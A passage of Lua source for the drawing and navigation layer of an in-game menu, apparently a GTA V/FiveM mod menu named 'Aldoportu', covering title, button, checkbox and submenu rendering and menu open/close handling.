			DrawSprite(Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleBackgroundSprite.dict, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleBackgroundSprite.name, x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.titleHeight, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
		else
			Aldoportu.drawRect(x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.titleHeight, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleBackgroundColor)
		end

		Aldoportu.drawText(Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].title, xText, y - Aldoportu.menuProps.titleHeight / 2 + Aldoportu.menuProps.titleYOffset, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleFont, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleColor, Aldoportu.menuProps.titleScale, true)
		Aldoportu.drawText(Aldoportu.menuProps._mVersion, xText + 0.2, y - Aldoportu.menuProps.titleHeight / 2 + Aldoportu.menuProps.titleYOffset + 0.020, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleFont, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleColor, Aldoportu.menuProps.titleScale - 0.3, true)
	end
end

function Aldoportu.drawSubTitle()
	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		local x = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width / 2
		local y = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].y + Aldoportu.menuProps.titleHeight + Aldoportu.menuProps.buttonHeight / 2

		local subTitleColor = { r = Aldoportu.mainColor.r, g = Aldoportu.mainColor.g, b = Aldoportu.mainColor.b, a = 255 }

		Aldoportu.drawRect(x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.buttonHeight, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].subTitleBackgroundColor)
		Aldoportu.drawText(Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].subTitle, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset, y - Aldoportu.menuProps.buttonHeight / 2 + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, subTitleColor, Aldoportu.menuProps.buttonScale, false)
		--[[Aldoportu.drawText(Aldoportu.menuProps._mVersion, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.232, y - Aldoportu.menuProps.buttonHeight / 2 + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, subTitleColor, Aldoportu.menuProps.buttonScale, true)]]

		if Aldoportu.menuProps.optionCount > Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount then
			Aldoportu.drawText(tostring(Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption)..' / '..tostring(Aldoportu.menuProps.optionCount), Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, y - Aldoportu.menuProps.buttonHeight / 2 + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, subTitleColor, Aldoportu.menuProps.buttonScale, false, false, true)
		end
	end
end

function Aldoportu.drawButton(arrowsprite, text, subText, spriteData)
	local x = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width / 2
	local multiplier = nil

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount and Aldoportu.menuProps.optionCount <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount then
		multiplier = Aldoportu.menuProps.optionCount
	elseif Aldoportu.menuProps.optionCount > Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption - Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount and Aldoportu.menuProps.optionCount <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption then
		multiplier = Aldoportu.menuProps.optionCount - (Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption - Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].y + Aldoportu.menuProps.titleHeight + Aldoportu.menuProps.buttonHeight + (Aldoportu.menuProps.buttonHeight * multiplier) - Aldoportu.menuProps.buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount then
			backgroundColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuFocusBackgroundColor
			textColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuFocusTextColor
			subTextColor = {r = Aldoportu.mainColor.r, g = Aldoportu.mainColor.g, b = Aldoportu.mainColor.b, a = 255}
		else
			backgroundColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuBackgroundColor
			textColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuTextColor
			subTextColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuSubTextColor
			shadow = true
		end

		Aldoportu.drawRect(x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.buttonHeight, backgroundColor)

		if spriteData then
			if not HasStreamedTextureDictLoaded(spriteData.dict) then Aldoportu.natives.requestStreamedTextureDict(spriteData.dict, true) end
			if Aldoportu.menuProps.menu_TextOutline then
				DrawSprite(spriteData.dict, spriteData.text, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.008, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0275, 0.0375, 0.0, 0, 0, 0, 255)
			end
			if Aldoportu.menuProps.selectedTheme ~= 'Classic' then
				DrawSprite(spriteData.dict, spriteData.text, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.008, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0255, 0.0355, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 155)
			end
			DrawSprite(spriteData.dict, spriteData.text, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.008, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0225, 0.0325, 0.0, spriteData.color.r, spriteData.color.g, spriteData.color.b, 255)
			Aldoportu.drawText(text, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.018, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, textColor, Aldoportu.menuProps.buttonScale, false, shadow)
		else
			Aldoportu.drawText(text, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, textColor, Aldoportu.menuProps.buttonScale, false, shadow)
		end

		if subText then
			Aldoportu.drawText(subText, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset, y - Aldoportu.menuProps.buttonHeight / 2 + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, subTextColor, Aldoportu.menuProps.buttonScale, false, shadow, true)
		end

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount and arrowsprite then
			if not HasStreamedTextureDictLoaded('commonmenu') then Aldoportu.natives.requestStreamedTextureDict('commonmenu', true) end
			if Aldoportu.menuProps.menu_TextOutline then
				DrawSprite('commonmenu', 'arrowright', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.240, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0245, 0.0365, 0.0, 0, 0, 0, 255)
			end
			DrawSprite('commonmenu', 'arrowright', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.240, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0225, 0.0325, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
		elseif arrowsprite then
			if not HasStreamedTextureDictLoaded('commonmenu') then Aldoportu.natives.requestStreamedTextureDict('commonmenu', true) end
			if Aldoportu.menuProps.menu_TextOutline then
				DrawSprite('commonmenu', 'arrowright', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.240, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0245, 0.0365, 0.0, 0, 0, 0, 255)
			end
			DrawSprite('commonmenu', 'arrowright', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.240, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0225, 0.0325, 0.0, 175, 175, 175, 155)
		end

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount and Aldoportu.menuProps.menu_RectOverlay then
			if not HasStreamedTextureDictLoaded('deadline') then Aldoportu.natives.requestStreamedTextureDict('deadline', true) end
			DrawSprite('deadline', 'deadline_trail_01', x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.buttonHeight, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 55)
		end
	end
end
local be_aN = 1
function Aldoportu.drawCheckbox(text, state)
	local x = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width / 2
	local multiplier = nil

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount and Aldoportu.menuProps.optionCount <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount then
		multiplier = Aldoportu.menuProps.optionCount
	elseif Aldoportu.menuProps.optionCount > Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption - Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount and Aldoportu.menuProps.optionCount <= Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption then
		multiplier = Aldoportu.menuProps.optionCount - (Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption - Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].y + Aldoportu.menuProps.titleHeight + Aldoportu.menuProps.buttonHeight + (Aldoportu.menuProps.buttonHeight * multiplier) - Aldoportu.menuProps.buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local shadow = false

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount then
			backgroundColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuFocusBackgroundColor
			textColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuFocusTextColor
		else
			backgroundColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuBackgroundColor
			textColor = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].menuTextColor
			shadow = true
		end

		Aldoportu.drawRect(x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.buttonHeight, backgroundColor)

		Aldoportu.drawText(text, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset, Aldoportu.menuProps.buttonFont, textColor, Aldoportu.menuProps.buttonScale, false, shadow)

		if not HasStreamedTextureDictLoaded('helicopterhud') then Aldoportu.natives.requestStreamedTextureDict('helicopterhud', true) end
		if not HasStreamedTextureDictLoaded('commonmenu') then Aldoportu.natives.requestStreamedTextureDict('commonmenu', true) end

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount then
			if state then
				if Aldoportu.menuProps.selectedCheckboxStyle == 'New' then
					DrawSprite('helicopterhud', 'hud_outline', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
					DrawSprite('commonmenu', 'shop_tick_icon', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
				elseif Aldoportu.menuProps.selectedCheckboxStyle == 'Old' then
					DrawSprite('commonmenu', 'shop_box_tick', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
				end
			else
				if Aldoportu.menuProps.selectedCheckboxStyle == 'New' then
					DrawSprite('helicopterhud', 'hud_lock', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
				elseif Aldoportu.menuProps.selectedCheckboxStyle == 'Old' then
					DrawSprite('commonmenu', 'shop_box_blank', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
				end
			end
		else
			if state then
				if Aldoportu.menuProps.selectedCheckboxStyle == 'New' then
					DrawSprite('helicopterhud', 'hud_outline', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, 155, 155, 155, 255)
					DrawSprite('commonmenu', 'shop_tick_icon', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, 155, 155, 155, 255)
				elseif Aldoportu.menuProps.selectedCheckboxStyle == 'Old' then
					DrawSprite('commonmenu', 'shop_box_tick', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, 155, 155, 155, 255)
				end
			else
				if Aldoportu.menuProps.selectedCheckboxStyle == 'New' then
					DrawSprite('helicopterhud', 'hud_lock', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, 155, 155, 155, 255)
				elseif Aldoportu.menuProps.selectedCheckboxStyle == 'Old' then
					DrawSprite('commonmenu', 'shop_box_blank', Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.buttonTextXOffset + 0.235, y - (Aldoportu.menuProps.buttonHeight / 2) + Aldoportu.menuProps.buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, 155, 155, 155, 255)
				end
			end
		end

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount and Aldoportu.menuProps.menu_RectOverlay then
			if not HasStreamedTextureDictLoaded('deadline') then Aldoportu.natives.requestStreamedTextureDict('deadline', true) end
			DrawSprite('deadline', 'deadline_trail_01', x, y, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width, Aldoportu.menuProps.buttonHeight, 0.0, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 55)
		end
	end
end

function Aldoportu.createMenu(id, title)
	--[[Default settings]]
	table.insert(Aldoportu.menus_list, id)
	Aldoportu.menuProps.shitMenus[id] = {}
	Aldoportu.menuProps.shitMenus[id].title = title
	Aldoportu.menuProps.shitMenus[id].subTitle = 'by N~s~er~s~t~s~ig~s~el'

	Aldoportu.menuProps.shitMenus[id].visible = false

	Aldoportu.menuProps.shitMenus[id].previousMenu = nil

	Aldoportu.menuProps.shitMenus[id].aboutToBeClosed = false

	Aldoportu.menuProps.shitMenus[id].x = 0.0175
	Aldoportu.menuProps.shitMenus[id].y = 0.025
	Aldoportu.menuProps.shitMenus[id].width = 0.23

	Aldoportu.menuProps.shitMenus[id].currentOption = 1
	Aldoportu.menuProps.shitMenus[id].maxOptionCount = Aldoportu.menuProps.maximumOptionCount

	Aldoportu.menuProps.shitMenus[id].titleFont = 1
	Aldoportu.menuProps.shitMenus[id].titleColor = { r = 0, g = 0, b = 0, a = 255 }
	Aldoportu.menuProps.shitMenus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 255 }
	Aldoportu.menuProps.shitMenus[id].titleBackgroundSprite = nil

	Aldoportu.menuProps.shitMenus[id].menuTextColor = { r = 150, g = 150, b = 150, a = 255 }
	Aldoportu.menuProps.shitMenus[id].menuSubTextColor = { r = 0, g = 0, b = 0, a = 255 }
	Aldoportu.menuProps.shitMenus[id].menuFocusTextColor = { r = 155, g = 155, b = 155, a = 255 }
	Aldoportu.menuProps.shitMenus[id].menuFocusBackgroundColor = { r = 0, g = 0, b = 0, a = 255 }
	Aldoportu.menuProps.shitMenus[id].menuBackgroundColor = { r = 55, g = 55, b = 55, a = 255 }

	Aldoportu.menuProps.shitMenus[id].subTitleBackgroundColor = { r = 35, g = 35, b = 35, a = 255 }
	Aldoportu.menuProps.shitMenus[id].subTitleTextColor = { r = Aldoportu.mainColor.r, g = Aldoportu.mainColor.g, b = Aldoportu.mainColor.b, a = 255 }

	Aldoportu.menuProps.shitMenus[id].buttonPressedSound = { name = 'SELECT', set = 'HUD_FRONTEND_DEFAULT_SOUNDSET' } --[[https://pastebin.com/0neZdsZ5]]

	Aldoportu.debugPrint(tostring(id)..' menu created')
end

function Aldoportu.createSubMenu(id, parent, subTitle)
	if Aldoportu.menuProps.shitMenus[parent] then
		Aldoportu.createMenu(id, Aldoportu.menuProps.shitMenus[parent].title)

		if subTitle then
			Aldoportu.setMenuProperty(id, 'subTitle', subTitle)
		else
			Aldoportu.setMenuProperty(id, 'subTitle', Aldoportu.menuProps.shitMenus[parent].subTitle)
		end

		Aldoportu.setMenuProperty(id, 'previousMenu', parent)

		Aldoportu.setMenuProperty(id, 'x', Aldoportu.menuProps.shitMenus[parent].x)
		Aldoportu.setMenuProperty(id, 'y', Aldoportu.menuProps.shitMenus[parent].y)
		Aldoportu.setMenuProperty(id, 'maxOptionCount', Aldoportu.menuProps.shitMenus[parent].maxOptionCount)
		Aldoportu.setMenuProperty(id, 'titleFont', Aldoportu.menuProps.shitMenus[parent].titleFont)
		Aldoportu.setMenuProperty(id, 'titleColor', Aldoportu.menuProps.shitMenus[parent].titleColor)
		Aldoportu.setMenuProperty(id, 'titleBackgroundColor', Aldoportu.menuProps.shitMenus[parent].titleBackgroundColor)
		Aldoportu.setMenuProperty(id, 'titleBackgroundSprite', Aldoportu.menuProps.shitMenus[parent].titleBackgroundSprite)
		Aldoportu.setMenuProperty(id, 'menuTextColor', Aldoportu.menuProps.shitMenus[parent].menuTextColor)
		Aldoportu.setMenuProperty(id, 'menuSubTextColor', Aldoportu.menuProps.shitMenus[parent].menuSubTextColor)
		Aldoportu.setMenuProperty(id, 'menuFocusTextColor', Aldoportu.menuProps.shitMenus[parent].menuFocusTextColor)
		Aldoportu.setMenuProperty(id, 'menuFocusBackgroundColor', Aldoportu.menuProps.shitMenus[parent].menuFocusBackgroundColor)
		Aldoportu.setMenuProperty(id, 'menuBackgroundColor', Aldoportu.menuProps.shitMenus[parent].menuBackgroundColor)
		Aldoportu.setMenuProperty(id, 'subTitleBackgroundColor', Aldoportu.menuProps.shitMenus[parent].subTitleBackgroundColor)
	else
		Aldoportu.debugPrint('Failed to create '..tostring(id)..' submenu: '..tostring(parent)..' parent menu doesn\'t exist')
	end
end

function Aldoportu.openMenu(id)
	if id and Aldoportu.menuProps.shitMenus[id] then
		Aldoportu.natives.playSoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
		Aldoportu.setMenuVisible(id, true)
		Aldoportu.debugPrint(tostring(id)..' menu opened')
	else
		Aldoportu.debugPrint('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
	end
end

function Aldoportu.isMenuOpened(id)
	return Aldoportu.isMenuVisible(id)
end

function Aldoportu.isAnyMenuOpened()
	for id, _ in pairs(Aldoportu.menuProps.shitMenus) do
		if Aldoportu.isMenuVisible(id) then return true end
	end

	return false
end

function Aldoportu.isMenuAboutToBeClosed()
	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		return Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].aboutToBeClosed
	else
		return false
	end
end

function Aldoportu.closeMenu()
	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].aboutToBeClosed then
			Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].aboutToBeClosed = false
			Aldoportu.setMenuVisible(Aldoportu.menuProps.currentMenu, false)
			Aldoportu.debugPrint(tostring(Aldoportu.menuProps.currentMenu)..' menu closed')
			Aldoportu.natives.playSoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			Aldoportu.menuProps.optionCount = 0
			Aldoportu.menuProps.currentMenu = nil
			Aldoportu.menuProps.currentKey = nil
		else
			Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].aboutToBeClosed = true
			Aldoportu.debugPrint(tostring(Aldoportu.menuProps.currentMenu)..' menu about to be closed')
		end
	end
end

function Aldoportu.button(text, subText, spriteData)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		Aldoportu.menuProps.optionCount = Aldoportu.menuProps.optionCount + 1

		local isCurrent = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount
		--[[local actualSubText = ''
		if subText == 'Native' then
			actualSubText = '~g~'..subText
		elseif subText == 'Client' or subText == 'ESX | Client' then
			actualSubText = '~y~'..subText
		elseif subText == 'Server' or subText == 'ESX | Server' then
			actualSubText = '~r~'..subText
		else
			actualSubText = subText
		end]]
		Aldoportu.drawButton(false, text, subText, spriteData)

		if isCurrent then
			if Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.select then
				Aldoportu.natives.playSoundFrontend(-1, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.name, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.set, true)
				Aldoportu.debugPrint(buttonText..' button pressed')
				return true
			elseif Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.left or Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.right then
				Aldoportu.natives.playSoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			end
		end

		return false
	else
		Aldoportu.debugPrint('Failed to create '..buttonText..' button: '..tostring(Aldoportu.menuProps.currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Aldoportu.checkboxButton(text, state)
	local buttonText = text

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		Aldoportu.menuProps.optionCount = Aldoportu.menuProps.optionCount + 1

		local isCurrent = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount

		Aldoportu.drawCheckbox(text, state)

		if isCurrent then
			if Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.select then
				Aldoportu.natives.playSoundFrontend(-1, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.name, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.set, true)
				Aldoportu.debugPrint(buttonText..' button pressed')
				return true
			elseif Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.left or Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.right then
				Aldoportu.natives.playSoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			end
		end

		return false
	else
		Aldoportu.debugPrint('Failed to create '..buttonText..' button: '..tostring(Aldoportu.menuProps.currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Aldoportu.button2(text, subText, spriteData)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		Aldoportu.menuProps.optionCount = Aldoportu.menuProps.optionCount + 1

		local isCurrent = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].currentOption == Aldoportu.menuProps.optionCount

		Aldoportu.drawButton(true, text, subText, spriteData)

		if isCurrent then
			if Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.select then
				Aldoportu.natives.playSoundFrontend(-1, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.name, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].buttonPressedSound.set, true)
				Aldoportu.debugPrint(buttonText..' button pressed')
				return true
			elseif Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.left or Aldoportu.menuProps.currentKey == Aldoportu.menuProps.keys.right then
				Aldoportu.natives.playSoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			end
		end

		return false
	else
		Aldoportu.debugPrint('Failed to create '..buttonText..' button: '..tostring(Aldoportu.menuProps.currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Aldoportu.menuButton(text, id, subText, spriteData)
	if Aldoportu.menuProps.shitMenus[id] then
		if Aldoportu.button2(text, subText, spriteData) then
			Aldoportu.setMenuVisible(Aldoportu.menuProps.currentMenu, false)
			Aldoportu.setMenuVisible(id, true, true)

			return true
		end
	else
		Aldoportu.debugPrint('Failed to create '..tostring(text)..' menu button: '..tostring(id)..' submenu doesn\'t exist')
	end

	return false
end

function Aldoportu.checkBox(text, checked, callback)
	--[[if Aldoportu.button(text, checked and '~g~Enabled' or '~r~Disabled') then]]
	if Aldoportu.checkboxButton(text, checked) then
		checked = not checked
